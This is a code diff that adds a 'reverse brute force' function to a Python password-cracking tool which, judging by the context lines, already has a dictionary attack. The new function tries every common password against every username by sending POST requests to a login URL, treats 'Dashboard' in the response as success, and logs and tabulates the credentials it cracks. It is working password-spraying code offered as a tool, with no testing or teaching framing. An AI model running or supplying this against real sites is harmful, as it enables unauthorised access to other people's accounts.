@@ -305,3 +305,76 @@ def dictionary_attack(file_path, file_type, dictionary_file):
         logging.info("Process interrupted by user.")
         summary_results()
     return None
+
+# Step 16: Define the reverse brute force attack function
+def reverse_brute_force(url, usernames_file, common_passwords_file):
+    global results
+    found_logins = []
+    try:
+        start_time = time.time()  # Record the start time
+        results = []  # Initialize the results list
+        success_logins = []  # Initialize the success logins list
+
+        try:
+            common_passwords = read_file_lines(common_passwords_file)  # Read common passwords
+        except FileNotFoundError:
+            update_progress(f"Common passwords file '{common_passwords_file}' not found.")
+            return None
+        except ValueError as e:
+            update_progress(str(e))
+            return None
+
+        try:
+            usernames = read_file_lines(usernames_file)  # Read usernames
+        except FileNotFoundError:
+            update_progress(f"Usernames file '{usernames_file}' not found.")
+            return None
+        except ValueError as e:
+            update_progress(str(e))
+            return None
+
+        attempt_counter = 0  # Initialize the attempt counter
+        total_attempts = len(usernames) * len(common_passwords)  # Calculate total attempts
+
+        with tqdm(total=total_attempts, desc="Reverse Brute Force Progress", unit="attempt", dynamic_ncols=True) as pbar:
+            for password in common_passwords:
+                for username in usernames:
+                    if stop_flag:
+                        update_progress("Process interrupted by user.")
+                        logging.info("Process interrupted by user.")
+                        summary_results()
+                        return None
+                    attempt_counter += 1  # Increment the attempt counter
+                    response = requests.post(url, data={'username': username, 'password': password})  # Send login request
+                    if 'Dashboard' in response.text:
+                        end_time = time.time()  # Record the end time
+                        results.append([attempt_counter, username, password, "Success", end_time - start_time])  # Append successful attempt
+                        success_logins.append((username, password, attempt_counter, end_time - start_time))  # Append successful login
+                        found_logins.append([attempt_counter, username, password, end_time - start_time])  # Append found login
+                        table = tabulate(found_logins, headers=["Attempt", "Username", "Password", "Time Taken"], tablefmt="grid")
+                        update_log(f"\nFound Logins:\n{table}")
+                        update_results_log(f"Password found: {password} for username: {username}\nTime taken: {end_time - start_time} seconds\nAttempts made: {attempt_counter}", success=True)
+                        logging.info(f"Password found: {password} for username: {username}")
+                        logging.info(f"Time taken: {end_time - start_time} seconds")
+                        logging.info(f"Attempts made: {attempt_counter}")
+                    else:
+                        results.append([attempt_counter, username, password, "Unsuccessful"])  # Append unsuccessful attempt
+                    pbar.update(1)  # Update the progress bar
+                    table = tabulate(results[-100:], headers=["Attempt", "Username", "Password", "Status"], tablefmt="grid")
+                    update_log(table)
+                    update_progress_bar(attempt_counter, total_attempts, start_time)
+                    root.update_idletasks()
+
+        if success_logins:
+            summary_table = tabulate(success_logins, headers=["Username", "Password", "Attempt", "Time Taken"], tablefmt="grid")
+            update_results_log(f"\nSummary of found logins:\n{summary_table}")
+            logging.info("Summary of found logins:\n" + summary_table)
+        else:
+            update_results_log("Password not found for any username.")
+            logging.info("Password not found for any username.")
+        update_progress_bar(total_attempts, total_attempts, start_time)
+    except KeyboardInterrupt:
+        update_progress("Process interrupted by user.")
+        logging.info("Process interrupted by user.")
+        summary_results()
+    return None
